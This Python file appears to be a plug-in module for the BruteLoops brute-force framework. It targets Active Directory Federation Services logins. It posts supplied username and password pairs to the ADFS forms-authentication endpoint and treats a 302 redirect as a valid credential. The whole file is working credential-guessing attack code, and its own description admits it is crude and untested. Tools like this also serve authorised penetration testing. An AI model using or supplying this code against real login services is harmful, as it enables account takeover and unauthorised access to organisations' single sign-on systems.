import requests
from BruteLoops.example.shortcuts.http import HTTPModule
from logging import getLogger,INFO

brute_logger = getLogger('BruteLoops.example.modules.http.adfs')
getLogger('urllib3.connectionpool').setLevel(INFO)

class Module(HTTPModule):

    name = 'http.adfs'
    brief_description = 'Active Directory Federated Services'
    description = 'Brute force an ADFS server. NOTE: this module has '
    'not been thoroughly tested and is quite crude. It effectively '
    'takes a base URL, and just updates the POST body with the supppl'
    'ied credentials. It may not work on all ADFS versions.'

    def __call__(self, username, password, *args, **kwargs):
        '''Make the module callable.
        '''

        # Craft the payload
        payload = {
            'UserName':username,
            'Password':password,
            'AuthMethod':'FormsAuthentication',
        }
        
        # Make the request while ignoring redirects
        resp = requests.post(
            self.url,
            data=payload,
            proxies=self.proxies,
            headers=self.headers,
            allow_redirects=False)

        # Credentials should be valid on a 302 redirect
        if resp.status_code == 302:
            valid = 1
        else:
            valid = 0

        # Return the outcome
        return (valid, username, password,)
